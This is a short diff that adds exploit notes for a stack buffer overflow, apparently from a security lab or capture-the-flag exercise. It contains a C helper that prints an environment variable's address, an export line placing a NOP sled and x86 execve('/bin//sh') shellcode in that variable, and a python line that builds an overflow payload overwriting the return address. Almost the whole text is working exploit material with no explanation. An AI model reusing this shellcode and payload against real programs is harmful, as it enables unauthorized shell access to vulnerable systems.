@@ -1,0 +1,19 @@
+getenv.c
+#include <unistd.h>
+
+
+
+int main(void)
+
+{
+
+  printf("EGG address: 0x%lx\n", getenv("CODE"));
+
+  return 0;
+
+}
+
+export CODE=`python -c 'print("\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
+./a.out
+>bffffeae
+python -c 'print("a"*4095 +"\n" + "B"*9 + "\xbf\xff\xfe\xae"[::-1] +"C"*20)' > /tmp/test
